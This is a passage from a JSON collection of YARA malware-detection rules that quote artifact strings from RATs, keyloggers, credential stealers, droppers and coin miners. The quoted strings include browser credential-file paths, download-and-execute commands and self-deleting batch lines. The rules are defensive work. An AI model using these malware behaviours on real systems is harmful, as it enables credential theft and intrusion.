wide\n      $s4 = \"WINMGMTS:\\\\\\\\.\\\\ROOT\\\\CIMV2\" fullword ascii\n      $s5 = \"UENCRYPTION\" fullword ascii\n      $s6 = \"TEXPORTAPIS\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.imphash ( ) == \"f98cebcae832abc3c46e6e296aecfc03\" and 5 of them )\n}","date":"2018-01-29 11:37:41","description":"Semiautomatic generated rule - file e.exe","minimum_yara":"1.7","name":"TopHat_Malware_Jan18_2_RID2EFB","reference":"https://researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/#appendix","required_modules":["pe"],"rule_hash":"9073fce95160eb5d15212bd6910a7253","score":75,"tags":["T1050","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule TopHat_BAT_RID2A97 : APT DEMO {\n   meta:\n      description = \"Semiautomatic generated rule - file cgen.bat\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/#appendix\"\n      date = \"2018-01-29 07:03:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"= New-Object IO.MemoryStream(,[Convert]::FromBase64String(\\\"\" ascii\n      $s2 = \"goto Start\" fullword ascii\n      $s3 = \":Start\" fullword ascii\n   condition: \n      filesize < 5KB and all of them\n}","date":"2018-01-29 07:03:21","description":"Semiautomatic generated rule - file cgen.bat","minimum_yara":"1.7","name":"TopHat_BAT_RID2A97","reference":"https://researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/#appendix","required_modules":[],"rule_hash":"deca5eb94fb296d708cfdae725ad8e34","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule Quasar_RAT_Jan18_1_RID2D35 : APT DEMO EXE FILE MAL T1047 {\n   meta:\n      description = \"Detects Quasar RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-vermin-quasar-rat-custom-malware-used-ukraine/\"\n      date = \"2018-01-29 10:22:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"ping -n 20 localhost > nul\" fullword wide\n      $s2 = \"HandleDownloadAndExecuteCommand\" fullword ascii\n      $s3 = \"DownloadAndExecute\" fullword ascii\n      $s4 = \"UploadAndExecute\" fullword ascii\n      $s5 = \"ShellCommandResponse\" fullword ascii\n      $s6 = \"Select * From Win32_ComputerSystem\" fullword wide\n      $s7 = \"Process could not be started!\" fullword wide\n      $s8 = \".Core.RemoteShell\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and $a1 and 3 of them\n}","date":"2018-01-29 10:22:01","description":"Detects Quasar RAT","minimum_yara":"1.7","name":"Quasar_RAT_Jan18_1_RID2D35","reference":"https://researchcenter.paloaltonetworks.com/2018/01/unit42-vermin-quasar-rat-custom-malware-used-ukraine/","required_modules":[],"rule_hash":"f2eb9597aff70686e9b2b1946dc34584","score":75,"tags":["T1047","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule Vermin_Keylogger_Jan18_1_RID2FFB : APT DEMO EXE FILE HKTL T1056 T1082 {\n   meta:\n      description = \"Detects Vermin Keylogger\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-vermin-quasar-rat-custom-malware-used-ukraine/\"\n      date = \"2018-01-29 12:20:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, HKTL, T1056, T1082\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"_keyloggerTaskDescription\" fullword ascii\n      $x2 = \"_keyloggerTaskAuthor\" fullword ascii\n      $x3 = \"GetKeyloggerLogsResponse\" fullword ascii\n      $x4 = \"GetKeyloggerLogs\" fullword ascii\n      $x5 = \"ExecuteUninstallKeyLoggerTask\" fullword ascii\n      $x6 = \"ExecuteInstallKeyLoggerTask\" fullword ascii\n      $x7 = \":\\\\Projects\\\\Vermin\\\\KeyboardHookLib\\\\\" ascii\n      $x8 = \":\\\\Projects\\\\Vermin\\\\CryptoLib\\\\\" ascii\n      $s1 = \"<RunHidden>k__BackingField\" fullword ascii\n      $s2 = \"set_SystemInfos\" fullword ascii\n      $s3 = \"set_RunHidden\" fullword ascii\n      $s4 = \"set_RemotePath\" fullword ascii\n      $s5 = \"ExecuteShellCommandTask\" fullword ascii\n      $s6 = \"Client.exe\" fullword wide\n      $s7 = \"xClient.Core.ReverseProxy.Packets\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( 1 of ( $x* ) or 3 of them )\n}","date":"2018-01-29 12:20:21","description":"Detects Vermin Keylogger","minimum_yara":"1.7","name":"Vermin_Keylogger_Jan18_1_RID2FFB","reference":"https://researchcenter.paloaltonetworks.com/2018/01/unit42-vermin-quasar-rat-custom-malware-used-ukraine/","required_modules":[],"rule_hash":"4723c8efae6af8af658fd0fcbc417901","score":75,"tags":["DEMO","T1056","FILE","APT","T1082","EXE","HKTL"]},{"author":"Florian Roth","content":"rule Suckfly_Nidiran_Gen_1_RID2F1F : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects Suckfly Nidiran Trojan\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates\"\n      date = \"2018-01-28 11:43:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WriteProcessMemory fail at %d \" fullword ascii\n      $s2 = \"CreateRemoteThread fail at %d \" fullword ascii\n      $s3 = \"CreateRemoteThread Succ\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them\n}","date":"2018-01-28 11:43:41","description":"Detects Suckfly Nidiran Trojan","minimum_yara":"1.7","name":"Suckfly_Nidiran_Gen_1_RID2F1F","reference":"https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates","required_modules":[],"rule_hash":"171722d7db6f3a7fa05e094a123e3f6e","score":75,"tags":["DEMO","EXE","GEN","FILE","MAL"]},{"author":"Florian Roth","content":"rule Suckfly_Nidiran_Gen_2_RID2F20 : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects Suckfly Nidiran Trojan\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates\"\n      date = \"2018-01-28 11:43:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"WorkDll.dll\" fullword ascii\n      $x2 = \"%userprofile%\\\\Security Center\\\\secriter.dll\" fullword ascii\n      $s1 = \"DLL_PROCESS_ATTACH is called\" fullword ascii\n      $s2 = \"Support Security Accounts Manager For Microsoft Windows.If this service is stopped, any services that depended on it will fail t\" ascii\n      $s3 = \"before CreateRemoteThread\" fullword ascii\n      $s4 = \"CreateRemoteThread Succ\" fullword ascii\n      $s5 = \"Microsoft Security Accounts Manager\" fullword ascii\n      $s6 = \"DoRunRemote\" fullword ascii\n      $s7 = \"AutoRunFun\" fullword ascii\n      $s8 = \"ServiceMain is called\" fullword ascii\n      $s9 = \"DllRegisterServer is called\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 4 of them )\n}","date":"2018-01-28 11:43:51","description":"Detects Suckfly Nidiran Trojan","minimum_yara":"1.7","name":"Suckfly_Nidiran_Gen_2_RID2F20","reference":"https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates","required_modules":[],"rule_hash":"ea0ceae36712ef05cb902b84d97d4812","score":75,"tags":["DEMO","EXE","GEN","FILE","MAL"]},{"author":"Florian Roth","content":"rule Suckfly_Nidiran_Gen_3_RID2F21 : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects Suckfly Nidiran Trojan\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates\"\n      date = \"2018-01-28 11:44:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"RUN SHELLCODE FAIL\" fullword ascii\n      $x2 = \"RUN PROCESS FAILD!\" fullword ascii\n      $x3 = \"DOWNLOAD FILE FAILD\" fullword ascii\n      $x4 = \"MODIFYCONFIG FAIL!\" fullword ascii\n      $x5 = \"GetFileAttributes FILE FAILD\" fullword ascii\n      $x6 = \"MODIFYCONFIG SUCC!\" fullword ascii\n      $s1 = \"cmd.exe /c %s\" fullword ascii\n      $s2 = \"error to create pipe!\" fullword ascii\n      $s3 = \"%s\\\\%08x.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"ae0f4ebf7e8ce91d6548318a3cf82b7a\" or 1 of ( $x* ) or 2 of them )\n}","date":"2018-01-28 11:44:01","description":"Detects Suckfly Nidiran Trojan","minimum_yara":"1.7","name":"Suckfly_Nidiran_Gen_3_RID2F21","reference":"https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates","required_modules":["pe"],"rule_hash":"664b38ad4af5129e5ba7ff1459a9a9c6","score":75,"tags":["DEMO","EXE","GEN","FILE","MAL"]},{"author":"Florian Roth","content":"rule OilRig_RGDoor_Gen1_RID2D8D : APT DEMO EXE FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects RGDoor backdoor used by OilRig group\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/\"\n      date = \"2018-01-27 10:36:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $c1 = { 00 63 6D 64 24 00 00 00 00 72 00 00 00 00 00 00 00 75 70 6C 6F\n              61 64 24 } \n      $c2 = { 63 61 6E 27 74 20 6F 70 65 6E 20 66 69 6C 65 3A 20 00 00 00 00\n              00 00 00 64 6F 77 6E 6C 6F 61 64 24 } \n      $s1 = \"MyNativeModule.dll\" fullword ascii\n      $s2 = \"RGSESSIONID=\" fullword ascii\n      $s3 = \"download$\" fullword ascii\n      $s4 = \".?AVCHelloWorld@@\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"47cb127aad6c7c9954058e61a2a6429a\" or 1 of ( $c* ) or 2 of them )\n}","date":"2018-01-27 10:36:41","description":"Detects RGDoor backdoor used by OilRig group","minimum_yara":"1.7","name":"OilRig_RGDoor_Gen1_RID2D8D","reference":"https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/","required_modules":["pe"],"rule_hash":"f72630c8f1a8e723a45bae8f51d740e1","score":80,"tags":["MAL","DEMO","FILE","MIDDLE_EAST","APT","EXE"]},{"author":"Florian Roth","content":"rule Elise_Jan18_1_RID2B74 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Elise malware samples - fake Norton Security NavShExt.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/blu3_team/status/955971742329135105\"\n      date = \"2018-01-24 09:07:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NavShExt.dll\" fullword wide\n      $s2 = \"Norton Security\" fullword wide\n      $a1 = \"donotbotherme\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and ( pe.imphash ( ) == \"e9478ee4ebf085d1f14f64ba96ef082f\" or ( 1 of ( $s* ) and $a1 ) )\n}","date":"2018-01-24 09:07:11","description":"Detects Elise malware samples - fake Norton Security NavShExt.dll","minimum_yara":"1.7","name":"Elise_Jan18_1_RID2B74","reference":"https://twitter.com/blu3_team/status/955971742329135105","required_modules":["pe"],"rule_hash":"93ed708cddd7fb5b7017e3e2573e8502","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MiniRAT_Gen_1_RID2B8E : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects Mini RAT malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.eff.org/deeplinks/2018/01/dark-caracal-good-news-and-bad-news\"\n      date = \"2018-01-22 09:11:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Mini rat\\\\\" ascii\n      $x2 = \"\\\\Projects\\\\ali\\\\Clever Components v7\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 7000KB and 1 of them\n}","date":"2018-01-22 09:11:31","description":"Detects Mini RAT malware","minimum_yara":"1.7","name":"MiniRAT_Gen_1_RID2B8E","reference":"https://www.eff.org/deeplinks/2018/01/dark-caracal-good-news-and-bad-news","required_modules":[],"rule_hash":"10c17d5bd8b17f889a95d1f820379e60","score":75,"tags":["DEMO","EXE","GEN","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Envrial_Jan18_1_RID2D8C : DEMO EXE FILE MAL T1003 {\n   meta:\n      description = \"Detects Encrial credential stealer malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/malwrhunterteam/status/953313514629853184\"\n      date = \"2018-01-21 10:36:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/Evrial/master/domen\" wide\n      $a1 = \"\\\\Opera Software\\\\Opera Stable\\\\Login Data\" fullword wide\n      $a2 = \"\\\\Comodo\\\\Dragon\\\\User Data\\\\Default\\\\Login Data\" fullword wide\n      $a3 = \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" fullword wide\n      $a4 = \"\\\\Orbitum\\\\User Data\\\\Default\\\\Login Data\" fullword wide\n      $a5 = \"\\\\Kometa\\\\User Data\\\\Default\\\\Login Data\" fullword wide\n      $s1 = \"dlhosta.exe\" fullword wide\n      $s2 = \"\\\\passwords.log\" fullword wide\n      $s3 = \"{{ <>h__TransparentIdentifier1 = {0}, Password = {1} }}\" fullword wide\n      $s4 = \"files/upload.php?user={0}&hwid={1}\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 3 of them or 2 of ( $s* ) )\n}","date":"2018-01-21 10:36:31","description":"Detects Encrial credential stealer malware","minimum_yara":"1.7","name":"MAL_Envrial_Jan18_1_RID2D8C","reference":"https://twitter.com/malwrhunterteam/status/953313514629853184","required_modules":[],"rule_hash":"1473f2906f2cce3c353426b7c6aae93f","score":75,"tags":["DEMO","EXE","T1003","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_unspecified_Jan18_1_RID2F4A : DEMO MAL {\n   meta:\n      description = \"Detects unspecified malware sample\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-01-19 11:50:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"User-Agent: Mozilla/4.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\" fullword ascii\n      $s2 = \"ping 192.0.2.2 -n 1 -w %d >nul 2>&1\" fullword ascii\n      $s3 = \"[Log Started] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\" fullword ascii\n      $s4 = \"start /b \\\"\\\" cmd /c del \\\"%%~f0\\\"&exit /b\" fullword ascii\n      $s5 = \"[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\" fullword ascii\n      $s6 = \"%s\\\\%s.bat\" fullword ascii\n      $s7 = \"DEL /s \\\"%s\\\" >nul 2>&1\" fullword ascii\n   condition: \n      filesize < 300KB and 2 of them\n}","date":"2018-01-19 11:50:51","description":"Detects unspecified malware sample","minimum_yara":"1.7","name":"MAL_unspecified_Jan18_1_RID2F4A","reference":"Internal Research","required_modules":[],"rule_hash":"53a088f662a88b8cbf6faa5c620a75f5","score":75,"tags":["DEMO","MAL"]},{"author":"Florian Roth","content":"rule Turla_Mal_Script_Jan18_1_RID2FD7 : DEMO RUSSIA SCRIPT T1064 {\n   meta:\n      description = \"Detects Turla malicious script\"\n      author = \"Florian Roth\"\n      reference = \"https://ghostbin.com/paste/jsph7\"\n      date = \"2018-01-19 12:14:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, RUSSIA, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".charCodeAt(i % \" ascii\n      $s2 = \"{WScript.Quit();}\" fullword ascii\n      $s3 = \".charAt(i)) << 10) |\" ascii\n      $s4 = \" = WScript.Arguments;var \" ascii\n      $s5 = \"= \\\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\\\";var i;\" ascii\n   condition: \n      filesize < 200KB and 2 of them\n}","date":"2018-01-19 12:14:21","description":"Detects Turla malicious script","minimum_yara":"1.7","name":"Turla_Mal_Script_Jan18_1_RID2FD7","reference":"https://ghostbin.com/paste/jsph7","required_modules":[],"rule_hash":"ef37261925ac30cf911b149dbb71c943","score":75,"tags":["DEMO","RUSSIA","T1064","SCRIPT"]},{"author":"Florian Roth (original rule by Chris Doman)","content":"rule NK_Miner_Malware_Jan18_1_RID2F9D : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Noth Korean Monero Miner mentioned in AlienVault report\"\n      author = \"Florian Roth (original rule by Chris Doman)\"\n      reference = \"https://goo.gl/PChE1z\"\n      date = \"2018-01-09 12:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x0 = \"c:\\\\users\\\\jawhar\\\\documents\\\\\" ascii\n      $x1 = \"C:\\\\Users\\\\Jawhar\\\\documents\\\\\" ascii\n      $x2 = \"The number of processors on this computer is {0}.\" fullword wide\n      $x3 = { 00 00 1F 43 00 3A 00 5C 00 4E 00 65 00 77 00 44\n              00 69 00 72 00 65 00 63 00 74 00 6F 00 72 00 79\n              00 00 } \n      $x4 = \"Le fichier Hello txt n'existe pas\" fullword wide\n      $x5 = \"C:\\\\NewDirectory2\\\\info2\" fullword wide\n      $a = \"82e999fb-a6e0-4094-aa1f-1a306069d1a5\" ascii\n      $b = \"4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRy5YeFCqgoUMnzumvS\" ascii\n      $c = \"barjuok.ryongnamsan.edu.kp\" wide ascii\n      $d = \"C:\\\\SoftwaresInstall\\\\soft\" wide ascii\n      $e = \"C:\\\\Windows\\\\Sys64\\\\intelservice.exe\" wide ascii\n      $f = \"C:\\\\Windows\\\\Sys64\\\\updater.exe\" wide ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them\n}","date":"2018-01-09 12:04:41","description":"Detects Noth Korean Monero Miner mentioned in AlienVault report","minimum_yara":"1.7","name":"NK_Miner_Malware_Jan18_1_RID2F9D","reference":"https://goo.gl/PChE1z","required_modules":[],"rule_hash":"94faaf399c450181bfb25b5d9b3a1876","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule CoinMiner_Strings_RID2DDE : DEMO SUSP {\n   meta:\n      description = \"Detects mining pool protocol string in Executable\"\n      author = \"Florian Roth\"\n      reference = \"https://minergate.com/faq/what-pool-address\"\n      date = \"2018-01-04 10:50:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"stratum+tcp://\" ascii\n      $s2 = \"\\\"normalHashing\\\": true,\" \n   condition: \n      filesize < 600KB and 1 of them\n}","date":"2018-01-04 10:50:11","description":"Detects mining pool protocol string in Executable","minimum_yara":"1.7","name":"CoinMiner_Strings_RID2DDE","reference":"https://minergate.com/faq/what-pool-address","required_modules":[],"rule_hash":"0376a5f767eae520701d2f90d49a36f7","score":60,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CoinHive_Javascript_MoneroMiner_RID3366 : DEMO SUSP {\n   meta:\n      description = \"Detects CoinHive - JavaScript Crypto Miner\"\n      author = \"Florian Roth\"\n      reference = \"https://coinhive.com/documentation/miner\"\n      date = \"2018-01-04 14:46:11\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"CoinHive.CONFIG.REQUIRES_AUTH\" fullword ascii\n   condition: \n      filesize < 65KB and 1 of them\n}","date":"2018-01-04 14:46:11","description":"Detects CoinHive - JavaScript Crypto Miner","minimum_yara":"1.7","name":"CoinHive_Javascript_MoneroMiner_RID3366","reference":"https://coinhive.com/documentation/miner","required_modules":[],"rule_hash":"a63b91b52e08cf7061223fc7d140e180","score":50,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule XMRIG_Monero_Miner_RID2DC1 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects Monero mining software\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/xmrig/xmrig/releases\"\n      date = \"2018-01-04 10:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"* COMMANDS:     'h' hashrate, 'p' pause, 'r' resume\" fullword ascii\n      $s2 = \"--cpu-affinity       set process affinity to CPU core(s), mask 0x3 for cores 0 and 1\" fullword ascii\n      $s3 = \"-p, --pass=PASSWORD      password for mining server\" fullword ascii\n      $s4 = \"* VERSIONS:     XMRig/%s libuv/%s%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d or uint16 ( 0 ) == 0x457f ) and filesize < 3000KB and 1 of them\n}","date":"2018-01-04 10:45:21","description":"Detects Monero mining software","minimum_yara":"1.7","name":"XMRIG_Monero_Miner_RID2DC1","reference":"https://github.com/xmrig/xmrig/releases","required_modules":[],"rule_hash":"72a3185a8d1fe6ea931f33242f3e33cf","score":75,"tags":["SUSP","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule XMRIG_Monero_Miner_Config_RID3076 : DEMO FILE SUSP {\n   meta:\n      description = \"Semiautomatic generated rule - from files config.json, config.json\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/xmrig/xmrig/releases\"\n      date = \"2018-01-04 12:40:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"\\\"cpu-affinity\\\": null,   // set process affinity to CPU core(s), mask \\\"0x3\\\" for cores 0 and 1\" fullword ascii\n      $s5 = \"\\\"nicehash\\\": false                  // enable nicehash/xmrig-proxy support\" fullword ascii\n      $s8 = \"\\\"algo\\\": \\\"cryptonight\\\",  // cryptonight (default) or cryptonight-lite\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x0a7b or uint16 ( 0 ) == 0x0d7b ) and filesize < 5KB and 1 of them\n}","date":"2018-01-04 12:40:51","description":"Semiautomatic generated rule - from files config.json, config.json","minimum_yara":"1.7","name":"XMRIG_Monero_Miner_Config_RID3076","reference":"https://github.com/xmrig/xmrig/releases","required_modules":[],"rule_hash":"cc7530e0cacabcf9ad370c91f9e8d822","score":75,"tags":["SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule VBS_dropper_script_Dec17_1_RID30AE : DEMO SCRIPT T1064 {\n   meta:\n      description = \"Detects a supicious VBS script that drops an executable\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-01-01 12:50:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"TVpTAQEAAAAEAA\" \n      $s2 = \"TVoAAAAAAAAAAA\" \n      $s3 = \"TVqAAAEAAAAEAB\" \n      $s4 = \"TVpQAAIAAAAEAA\" \n      $s5 = \"TVqQAAMAAAAEAA\" \n      $a1 = \"= CreateObject(\\\"Wscript.Shell\\\")\" fullword ascii\n   condition: \n      filesize < 600KB and $a1 and 1 of ( $s* )\n}","date":"2018-01-01 12:50:11","description":"Detects a supicious VBS script that drops an executable","minimum_yara":"1.7","name":"VBS_dropper_script_Dec17_1_RID30AE","reference":"Internal Research","required_modules":[],"rule_hash":"519fa7f7c61808fce2bc2aa4e415023e","score":75,"tags":["DEMO","T1064","SCRIPT"]},{"author":"Florian Roth","content":"rule RemCom_RemoteCommandExecution_RID3292 : DEMO HKTL T1077 {\n   meta:\n      description = \"Detects strings from RemCom tool\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/tezXZt\"\n      date = \"2017-12-28 14:10:51\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1077\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" \n      $ = \"%s\\\\pipe\\\\%s%s%d%s\" \n      $ = \"\\\\ADMIN$\\\\System32\\\\%s%s\" \n   condition: \n      1 of them\n}","date":"2017-12-28 14:10:51","description":"Detects strings from RemCom tool","minimum_yara":"1.7","name":"RemCom_RemoteCommandExecution_RID3292","reference":"https://goo.gl/tezXZt","required_modules":[],"rule_hash":"7d2f1910425736b7e1185a717e446133","score":50,"tags":["DEMO","T1077","HKTL"]},{"author":"Florian Roth","content":"rule PowerShell_Suite_Hacktools_Gen_Strings_RID3648 : DEMO GEN SCRIPT T1064 T1086 {\n   meta:\n      description = \"Detects strings from scripts in the PowerShell-Suite repo\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/FuzzySecurity/PowerShell-Suite\"\n      date = \"2017-12-27 16:49:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, GEN, SCRIPT, T1064, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"[!] NtCreateThreadEx failed..\" fullword ascii\n      $ = \"[?] Executing mmc..\" ascii\n      $ = \"[!] This method is only supported on 64-bit!\" fullword ascii\n      $ = \"$LNK = [ShellLink.Shortcut]::FromByteArray($LNKHeader.GetBytes())\" fullword ascii\n      $ = \"$CallResult = [UACTokenMagic]::TerminateProcess($ShellExecuteInfo.hProcess, 1)\" fullword ascii\n      $ = \"[!] Unable to open process (as Administrator), this may require SYSTEM access.\" fullword ascii\n      $ = \"[!] Error, NTSTATUS Value: \" ascii\n      $ = \"[!] UAC artifact: \" ascii\n      $ = \"[>] Process dump success!\" ascii\n      $ = \"[!] Process dump failed!\" ascii\n      $ = \"[+] Eidolon entry point:\" fullword ascii\n      $ = \"Wait for shellcode to run\" fullword ascii\n      $ = \"$Command = Read-Host \\\"`nSMB shell\\\"\" fullword ascii\n      $ = \"Use Netapi32::NetSessionEnum to enumerate active sessions on domain joined machines.\" fullword ascii\n      $ = \"Invoke-CreateProcess -Binary C:\\\\Windows\\\\System32\\\\\" ascii\n      $ 